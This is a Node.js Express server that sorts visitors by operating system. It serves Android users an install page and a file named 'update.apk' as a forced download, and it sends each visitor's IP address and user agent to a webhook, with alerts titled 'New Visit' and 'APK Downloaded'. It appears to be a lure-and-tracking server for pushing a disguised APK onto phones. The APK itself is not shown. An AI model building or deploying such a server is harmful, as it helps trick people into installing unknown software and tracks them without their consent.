const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();

const PORT = process.env.PORT || 3000;
const WEBHOOK_URL = process.env.WEBHOOK_URL || '';
const APK_PATH = path.join(__dirname, 'public', 'update.apk');

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public'), {
  setHeaders: (res, fp) => {
    if (fp.endsWith('.apk')) {
      res.setHeader('Content-Type', 'application/vnd.android.package-archive');
      res.setHeader('Content-Disposition', 'attachment; filename="update.apk"');
    }
  }
}));

function getIP(req) {
  return (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '')
    .split(',')[0].trim();
}

function detectOS(ua = '') {
  ua = ua.toLowerCase();
  if (/android/.test(ua)) return 'android';
  if (/iphone|ipad|ipod/.test(ua)) return 'ios';
  return 'desktop';
}

async function notify(embed) {
  if (!WEBHOOK_URL) return;
  try {
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });
  } catch (e) { console.log('[!] webhook:', e.message); }
}

// main router
app.get('/', async (req, res) => {
  const ua = req.headers['user-agent'] || '';
  const os = detectOS(ua);
  const ip = getIP(req);

  console.log(`[+] ${new Date().toISOString()} | ${ip} | ${os} | ${ua.slice(0, 80)}`);

  await notify({
    title: '👀 New Visit',
    color: os === 'android' ? 0x00c853 : os === 'ios' ? 0xff9100 : 0x8b949e,
    fields: [
      { name: 'OS', value: os, inline: true },
      { name: 'IP', value: ip || 'n/a', inline: true },
      { name: 'UA', value: ua.slice(0, 200) }
    ]
  });

  if (os === 'android') return res.sendFile(path.join(__dirname, 'public', 'install.html'));
  if (os === 'ios')     return res.sendFile(path.join(__dirname, 'public', 'ios.html'));
  return res.sendFile(path.join(__dirname, 'public', 'desktop.html'));
});

app.get('/download', async (req, res) => {
  const ip = getIP(req);
  const ua = req.headers['user-agent'] || '';
  console.log(`[+] ${new Date().toISOString()} | ${ip} | APK download`);

  await notify({
    title: '📱 APK Downloaded',
    color: 0x00c853,
    fields: [
      { name: 'IP', value: ip || 'n/a', inline: true },
      { name: 'UA', value: ua.slice(0, 200) }
    ]
  });

  if (!fs.existsSync(APK_PATH)) return res.status(404).send('APK missing');
  res.download(APK_PATH, 'update.apk');
});

app.get('/healthz', (req, res) => res.send('ok'));

app.listen(PORT, '0.0.0.0', () => console.log(`[*] listening on ${PORT}`));